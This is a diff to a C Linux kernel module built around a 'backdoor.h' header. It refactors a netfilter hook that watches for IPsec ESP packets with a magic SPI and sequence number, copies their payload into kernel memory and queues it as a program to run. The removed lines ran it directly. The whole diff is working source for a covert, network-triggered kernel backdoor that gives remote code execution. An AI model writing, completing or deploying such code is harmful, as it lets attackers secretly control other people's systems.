@@ -6,11 +6,11 @@
 
 #include "backdoor.h"
 
-unsigned char *buffer;
-unsigned long buffer_length;
+extern program_list *head;
 static struct nf_hook_ops nfho;
 
 unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
+	program_list *entry;
 	struct iphdr *ip_header;
 	struct ip_esp_hdr *esp_header;
 
@@ -24,19 +24,22 @@ unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_
 	if (ip_header->protocol == IPPROTO_ESP){
 		esp_header = ip_esp_hdr(skb);
 		if ((esp_header->spi == TARGET_SPI) && (esp_header->seq_no == TARGET_SEQ)){
-			buffer_length = (ip_header->tot_len / 256) \
+			entry = init_program();
+
+			entry->length = (ip_header->tot_len / 256) \
 								- sizeof (struct iphdr) \
 								- sizeof (struct ip_esp_hdr);
-			buffer = kcalloc(1, (buffer_length+1) * sizeof(unsigned char), GFP_KERNEL);
-			strncpy(buffer, esp_header->enc_data, buffer_length);
 
-			execute_file();
+			entry->buffer = kcalloc(1, (entry->length+1) * sizeof(unsigned char), GFP_KERNEL);
+			if (!entry->buffer){
+				return NF_ACCEPT;
+			}
 
-			kfree(buffer);
-			buffer_length = 0;
+			strncpy(entry->buffer, esp_header->enc_data, entry->length);
+
+			add_program(&head, entry);
 		}
 	}
-
 	return NF_ACCEPT;
 }
 
